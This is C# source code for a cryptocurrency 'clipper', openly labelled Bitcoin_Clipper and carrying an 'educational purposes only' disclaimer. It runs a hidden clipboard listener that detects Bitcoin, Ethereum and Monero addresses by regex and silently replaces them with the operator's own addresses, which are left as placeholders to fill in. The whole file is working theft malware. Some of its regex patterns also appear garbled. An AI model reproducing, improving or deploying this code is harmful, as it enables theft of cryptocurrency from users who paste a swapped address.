using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;
using System.Threading;



/*
 * │ Author       : Project AM
 * │ Youtube      : https://www.youtube.com/channel/UCwI8AQlBewsdxbyk2r4n9CQ/videos?view_as=subscriber
 * │ Contact      : https://github.com/am-523/
 * 
 * This program Is distributed for educational purposes only.
 */

namespace Bitcoin_Clipper
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
      
        public static void Run()
        {
            Application.Run(new ClipboardNotification.NotificationForm());
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            new Thread(() => { Run(); }).Start();
        }
    }

    internal static class Addresses
    {
        public readonly static string btc = "123abcedede"; //you btc address
        public readonly static string ethereum = "Ethereum"; //youeth address
        public readonly static string xmr = "XMR"; //you xmr address
    }

    internal static class PatternRegex
    {
        public readonly static Regex btc = new Regex(@"\b(bced1|[15])[a-z6A-H6J-NP6-Z06-96]{26,35}\b");
        public readonly static Regex ethereum = new Regex(@"\b0x[a-fA-F0-9]{40}\b");
        public readonly static Regex xmr = new Regex(@"\b4([0-9]|[A-B])(.){93}\b");
    }

    internal static class NativeMethods
    {
        public const int WM_CLIPBOARDUPDATE = 0x031D;
        public static IntPtr HWND_MESSAGE = new IntPtr(-3);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
    }

    internal static class Clipboard
    {
        public static string GetText()
        {
            string ReturnValue = string.Empty;
            Thread STAThread = new Thread(
                delegate ()
                {
                    ReturnValue = System.Windows.Forms.Clipboard.GetText();
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();

            return ReturnValue;
        }

        public static void SetText(string txt)
        {
            Thread STAThread = new Thread(
                delegate ()
                {
                    System.Windows.Forms.Clipboard.SetText(txt);
                });
            STAThread.SetApartmentState(ApartmentState.STA);
            STAThread.Start();
            STAThread.Join();
        }
    }

    public sealed class ClipboardNotification
    {
        public class NotificationForm : Form
        {
            private static string currentClipboard = Clipboard.GetText();
            public NotificationForm()
            {
                NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
                NativeMethods.AddClipboardFormatListener(Handle);
            }

            private bool RegexResult(Regex pattern)
            {
                if (pattern.Match(currentClipboard).Success) return true;
                else
                    return false;
            }

            protected override void WndProc(ref Message m)
            {
                if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                {
                    currentClipboard = Clipboard.GetText();

                    if (RegexResult(PatternRegex.btc) && !currentClipboard.Contains(Addresses.btc))
                    {
                        string result = PatternRegex.btc.Replace(currentClipboard, Addresses.btc);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.ethereum) && !currentClipboard.Contains(Addresses.ethereum))
                    {
                        string result = PatternRegex.ethereum.Replace(currentClipboard, Addresses.ethereum);
                        Clipboard.SetText(result);
                    }

                    if (RegexResult(PatternRegex.xmr) && !currentClipboard.Contains(Addresses.xmr))
                    {
                        string result = PatternRegex.xmr.Replace(currentClipboard, Addresses.xmr);
                        Clipboard.SetText(result);
                    }

                }
                base.WndProc(ref m);
            }



            private void button1_Click(object sender, EventArgs e)
            {

            }


        }
    }
}
